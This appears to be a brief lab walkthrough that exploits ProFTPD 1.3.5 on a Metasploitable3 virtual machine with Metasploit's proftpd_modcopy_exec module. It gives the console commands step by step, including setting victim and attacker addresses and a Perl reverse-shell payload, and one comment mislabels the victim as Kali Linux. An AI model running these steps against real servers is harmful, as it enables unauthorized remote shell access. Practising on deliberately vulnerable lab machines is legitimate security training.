# Metasploit Exploitation

This document outlines the process of exploiting a **ProFTPD 1.3.5** server on Metasploitable3 using the `proftpd_modcopy_exec` exploit in Metasploit.

## Exploitation Steps

### 1. Starting Metasploit Framework

Launched the Metasploit Console:

```bash
msfconsole
```

![attacker 1](./screenshots/attacker-1.png)

### 2. Selecting the Exploit

Used the `proftpd_modcopy_exec` module targeting ProFTPD 1.3.5:

```bash
use exploit/unix/ftp/proftpd_modcopy_exec
```

![attacker 2](./screenshots/attacker-2.png)

### 3. Configuring the Exploit

Verified settings:

```bash
show options
```

![attacker 3](./screenshots/attacker-3.png)

#### Set Parameters

```bash
set RHOSTS 192.168.56.102   # Victim's IP (Kali Linux)
set LHOST 192.168.56.101    # Attacker's IP (Kali Linux)
set SITEPATH /var/www/html/
```

![attacker 4](./screenshots/attacker-4.png)

### 4. Payload Configuration

Selected a Perl-based reverse shell payload for reliability:

```bash
set payload cmd/unix/reverse_perl
```

![attacker 5](./screenshots/attacker-5.png)

### 5. Executing the Exploit

Launched the exploit:

```bash
exploit
```

![attacker 6](./screenshots/attacker-6.png)
